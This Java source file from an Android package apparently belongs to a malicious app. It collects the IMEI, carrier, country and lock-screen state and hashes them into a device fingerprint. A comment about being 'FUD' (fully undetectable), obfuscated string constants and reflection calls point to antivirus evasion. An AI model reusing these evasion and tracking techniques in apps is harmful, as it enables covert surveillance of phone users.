package com.moonny.helpers;

import android.app.KeyguardManager;
import android.content.Context;
import android.content.pm.ApplicationInfo;
import android.content.pm.PackageManager;
import android.os.Build;
import android.provider.Settings;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.moonny.constants.Constant;
import com.moonny.constants.S;
import com.moonny.helpers.Utils;

import java.lang.reflect.Method;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

public class IDUtility {

    public static String getIMEI(Context context) {
        TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
        String deviceIMEI = telephonyManager.getDeviceId();
        return (deviceIMEI == null) ? "" : deviceIMEI;
    }

    // used before Main module loaded
    public static String getCarrier(Context ctx){
        TelephonyManager telephonyManager = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
        String simname = telephonyManager.getSimOperatorName();

        // FUD from !simname.isEmpty()
        return (!simname.equals(""))? simname : telephonyManager.getNetworkOperatorName();
    }

    private static String getPseudoUnicalID(){
        return S.IDUtil_pseudo +
                Build.BOARD.length()%10 + Build.BRAND.length()%10 +
                Build.CPU_ABI.length()%10 + Build.DEVICE.length()%10 +
                Build.DISPLAY.length()%10 + Build.HOST.length()%10 +
                Build.ID.length()%10 + Build.MANUFACTURER.length()%10 +
                Build.MODEL.length()%10 + Build.PRODUCT.length()%10 +
                Build.TAGS.length()%10 + Build.TYPE.length()%10 +
                Build.USER.length()%10;
    }

    public static String getID(Context context){
        String builder = getIMEI(context) +
                getPseudoUnicalID() +
                Settings.Secure.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        return Utils.md5(builder);
    }

    public static Long getPhoneTimestamp()
    {
        return System.currentTimeMillis()/1000;
    }

    public static boolean isPhoneLocked(Context ctx)
    {
        KeyguardManager km = (KeyguardManager) ctx.getSystemService(Context.KEYGUARD_SERVICE);
        return km.inKeyguardRestrictedInputMode();
    }

    public static String getCountry(TelephonyManager telephonyManager) {
        return telephonyManager.getNetworkCountryIso();
    }

    public static String getSimCountry(TelephonyManager telephonyManager) {
        return telephonyManager.getSimCountryIso();
    }

//    public static String getCellName(TelephonyManager telephonyManager) {
////        String simname = telephonyManager.getSimOperatorName();
////
////        if(simname == "")
////            simname = telephonyManager.getNetworkOperatorName();
//
//        String simname = "";
////        Method m = null;
//        try{
//            Method m = telephonyManager.getClass().getDeclaredMethod(S.getSimOperatorName);
//            simname = (String) m.invoke(telephonyManager);
//
//            if(simname.isEmpty())
//            {
//                m = telephonyManager.getClass().getDeclaredMethod(S.getNetworkOperatorName);
//                simname = (String) m.invoke(telephonyManager);
//            }
//        }catch(Exception e){
//            if(Constant.DEBUG) Log.d(S.IDUtil, "ERROR: " + e.getMessage());
//            e.printStackTrace();
//        }
//
//        return simname;
//    }

//    public static String getNumber(TelephonyManager telephonyManager) {
//        return telephonyManager.getLine1Number();
//    }

//    public static String getOsVersion() {
//        return Build.VERSION.RELEASE;
//    }

//    public static String getDeviceModel() {
//        return Build.MANUFACTURER + " " + Build.MODEL;
//    }

}